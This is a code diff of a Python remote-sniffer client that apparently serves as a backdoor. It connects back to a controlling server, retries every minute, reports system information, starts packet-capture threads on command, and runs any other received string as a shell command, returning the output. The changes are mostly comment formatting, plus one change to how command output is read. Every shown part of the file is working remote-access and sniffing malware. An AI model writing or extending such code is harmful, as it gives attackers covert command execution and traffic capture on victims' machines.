@@ -25,7 +25,7 @@ class RemoteSnifferClient:
         self.sniffer = RemoteSniffer(self.host)
 
 
-    #format text to bold and red 
+    # format text to bold and red 
     def convert_text_bold_red(self, text):
             RESET = "\033[0m"
             BOLD = "\033[1m"
@@ -34,7 +34,7 @@ class RemoteSnifferClient:
 
 
 
-    #tries to connect back to the server
+    # tries to connect back to the server
     def establish_connection(self):
 
         while True:
@@ -50,13 +50,13 @@ class RemoteSnifferClient:
 
             except socket.error as err:
                 print(err)
-                time.sleep(60) #try to reconnect after 1 minute
+                time.sleep(60) # try to reconnect after 60 seconds
 
-        #send system info
+        # send system info
         self.send_system_info()
 
 
-        #create sniffer threads
+        # create sniffer threads
         capture_thread = None
         capture_handle_thread = None
 
@@ -92,7 +92,7 @@ class RemoteSnifferClient:
 
             elif cmd == "start sniffer":
                 try:
-                     #create sniffer threads
+                     # create sniffer threads
                     capture_thread = threading.Thread(target=self.sniffer.main)
                     capture_handle_thread = threading.Thread(target=self.sniffer.process_captures, args=(self.sock2,))
 
@@ -127,8 +127,7 @@ class RemoteSnifferClient:
             else:
                 try:
                     terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    stdout, stderr = terminal_output.communicate() # This waits for the command to complete and collects stdout and stderr
-                    terminal_output = stdout + stderr 
+                    terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
 
                     output_data = terminal_output.decode() + "\n" + self.convert_text_bold_red("Sniffer: ") + os.getcwd() + ": "
                     self.sock1.send(output_data.encode()) 
@@ -139,7 +138,7 @@ class RemoteSnifferClient:
 
 
 
-    #returns client system information
+    # returns client system information
     def get_platform_info(self):
         sys_info = {
             "system": platform.uname().system,
